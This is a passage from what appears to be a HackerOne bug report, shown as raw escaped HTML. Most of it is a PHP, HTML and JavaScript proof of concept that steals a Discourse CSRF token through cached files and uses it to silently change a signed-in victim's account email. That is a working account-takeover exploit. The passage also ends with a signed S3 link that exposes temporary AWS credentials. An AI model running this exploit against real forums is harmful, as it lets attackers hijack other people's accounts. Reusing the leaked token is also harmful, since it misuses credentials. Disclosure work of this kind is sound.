class=\"nv\"\u003e$matches\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/X-Discourse-Username: (.*)/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eimplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$http_response_header\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"nv\"\u003e$name_matches\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$matches\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$name_matches\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e#random file to taint with csrf-token\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003emt_rand\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e100000\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e999999\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e/u/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e.css\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e/u/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e.css\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e/u/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e.css\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonerror=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;f()\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003echange_email_to\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$email_to_change_to\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003efetch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e?fetch=1\u0026amp;f=\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$rand\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e()}).\u003c/span\u003e\u003cspan class=\"nx\"\u003ethen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eYou are currently running the PHP on a different Cloudflare region\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ef\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eaction\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/users/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/preferences/email\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003esubmitRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esubmitRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecsrf\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereadyState\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eAccount email for \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e has been changed to: \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003echange_email_to\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$discourse\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/users/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e/preferences/email.json\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eAccept\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etext\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e/html\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eapplication\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\u003cspan class=\"s2\"\u003e/x-www-form-urlencoded\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e_method=PUT\u0026amp;email=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003echange_email_to\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;authenticity_token=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecsrf\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eUint8Array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echarCodeAt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \n  \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eBlob\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"nx\"\u003eaBody\u003c/span\u003e\u003cspan class=\"p\"\u003e]));\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;f\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#95;method\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PUT\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$email_to_change_to\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;authenticity\u0026amp;#95;token\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;csrf\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;display: none;\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      Please wait...\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-08-16_at_14.56.30.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/374/62bc0a155ef9b43daa0e3d8a4c06620107307581/Screen_Shot_2017-08-16_at_14.56.30.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-16_at_14.56.30.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-16_at_14.56.30.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ4HB4ZZGG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T051452Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIFBKbMTaGKwVCK0x7JNAOijlMVw%2BhW%2FIG%2FoSYnjiHiHKAiALX1HXrCEc%2FI%2FnVrq803X%2FALiQpBxAlCHE%2Bh8zwqcfmSq0AwhVEAEaDDAxMzYxOTI3NDg0OSIM1pLsQIVwlUu9%2FWdzKpEDno5dfN3IVf%2B7OsdAYS9SWEsPaEcB2YetTOtoMoT8QkXafStRJxQSEckvansRxadLw3NEtOPJvUCKQ1FSfSh7PFvC6uVfFJETqBnLL3fMQIGcAQZlOES1A7KCuxJT2s%2FayJYm9KXYzydI49kvJbjn3MhPgu4OzSnr601lrMTBegiJpfNO%2B%2FeSktzRhCINpAxF%2F2a4j2lstKLfaje8wR6hRJqdSRWJF9M8hMiccij8fb6xzNCHJahS%2BfaEo7RLAy5%2FPpBxYVi3ogO%2Bi%2F4BRT3eb1Z9RpGG9qNkGuyY7ce3DvMgdTkSjHBcsYXBywd8fd%2BaBZwWJd5uw351hwVm22gEjaBsMXjDBuKYWVQcA%2BrEoUuOGGuH6bDr%2B2WdDMHHXX7MgZgH7ziMbq2HG%2FZKMv1Xym51QlR6qp3%2BP6Xz3oMScAiG6Dqm%2FjDmNx9bwBHdu7tvsWABnhe6esdM9Fno0WZ3lIkHOq